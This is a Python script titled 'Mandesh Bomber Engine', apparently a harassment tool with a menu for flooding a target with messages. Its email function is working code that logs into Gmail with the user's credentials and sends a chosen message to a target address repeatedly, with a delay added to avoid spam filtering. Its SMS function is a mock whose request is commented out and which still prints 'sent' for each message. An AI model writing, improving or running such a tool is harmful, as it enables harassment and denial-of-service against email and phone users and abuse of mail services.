import smtplib
import requests
import time
from colorama import Fore, Style

class MandeshBomber:
    def __init__(self):
        self.headers = {'User-Agent': 'Mozilla/5.0'}

    def email_bomber(self, target_email, sender_email, password, message, count):
        print(f"{Fore.YELLOW}[!] Starting Email Attack...{Style.RESET_ALL}")
        try:
            # Using Gmail's SMTP server as the default
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(sender_email, password)
            
            for i in range(1, count + 1):
                server.sendmail(sender_email, target_email, message)
                print(f"{Fore.GREEN}[+] Email {i} sent successfully.{Style.RESET_ALL}")
                time.sleep(1) # Delay to avoid being flagged as spam
            server.quit()
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

    def sms_bomber(self, phone_number, count):
        # We use a modular API approach instead of hardcoded links
        # This simulates a 'Request' to common service providers
        print(f"{Fore.CYAN}[*] Starting SMS Bomber for {phone_number}...{Style.RESET_ALL}")
        
        # Example API endpoint (simulated)
        api_url = "https://api.example.com/v1/send-otp" 
        
        for i in range(1, count + 1):
            try:
                # payload = {"phone": phone_number}
                # requests.post(api_url, data=payload, headers=self.headers)
                print(f"{Fore.GREEN}[+] SMS {i} sent.{Style.RESET_ALL}")
                time.sleep(2)
            except:
                pass

if __name__ == "__main__":
    bomber = MandeshBomber()
    print(f"\n{Fore.RED}--- Mandesh Bomber Engine ---{Style.RESET_ALL}")
    print("[1] Email Bomber\n[2] SMS Bomber (API Mock)")
    choice = input("\nSelect >> ")

    if choice == "1":
        target = input("Target Email: ")
        sender = input("Your Email (Gmail): ")
        pw = input("App Password: ")
        msg = input("Message: ")
        amount = int(input("Amount: "))
        bomber.email_bomber(target, sender, pw, msg, amount)
    elif choice == "2":
        num = input("Phone Number: ")
        amount = int(input("Amount: "))
        bomber.sms_bomber(num, amount)
